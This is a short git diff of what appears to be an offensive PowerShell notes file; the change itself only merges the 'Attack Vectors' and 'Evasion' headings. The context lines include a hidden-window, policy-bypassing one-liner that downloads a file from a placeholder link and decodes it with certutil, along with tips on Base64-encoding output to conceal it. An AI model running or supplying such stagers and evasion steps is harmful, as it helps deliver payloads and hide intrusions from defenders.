@@ -31,7 +31,7 @@ powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -
 | Clear-EventLog          | Deletes all of the entries from the specified event logs on the local computer or on remote computers |
 | Clear-RecycleBin        | Deletes the content of a computer's recycle bin                                                       |
 
-# Attack Vectors:
+# Attack Vectors, Evasion, and More:
 
 ### PowerShell Gallery Modules
 
@@ -62,8 +62,6 @@ $base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes
 ```
 
 - You can also decode Base64 using `certutil`. `Certutil` is a command-line utility in Windows operating systems primarily designed for managing certificates. You can decode Base64 by simply running `certutil -f -decode path/to/file`.
-
-# Evasion:
 
 - Just as you can run commands from Base64 in PowerShell, you can also convert command output to Base64 to conceal it.
 
